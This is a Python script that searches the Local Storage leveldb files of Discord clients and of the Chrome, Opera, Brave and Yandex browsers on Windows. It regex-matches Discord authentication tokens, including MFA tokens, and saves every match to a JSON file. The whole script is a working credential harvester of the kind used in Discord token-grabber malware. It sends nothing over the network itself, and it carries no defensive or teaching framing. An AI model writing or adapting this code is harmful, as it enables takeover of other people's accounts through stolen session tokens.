import os
import re
import json
import argparse
from rich.progress import Progress

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        with open(f'{path}\\{file_name}', errors='ignore', encoding='utf-8') as f:
            for line in [x.strip() for x in f.readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        yield token

def main(args):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    data = {}
    with Progress() as progress:
        task = progress.add_task("[cyan]Gathering Tokens...", total=len(paths))
        for platform, path in paths.items():
            if os.path.exists(path):
                data[platform] = list(find_tokens(path))
            progress.advance(task)

    with open(args.output_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

    print('Done!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--output-file', '-o', default='temp.json', help='Output file name')
    args = parser.parse_args()
    main(args)
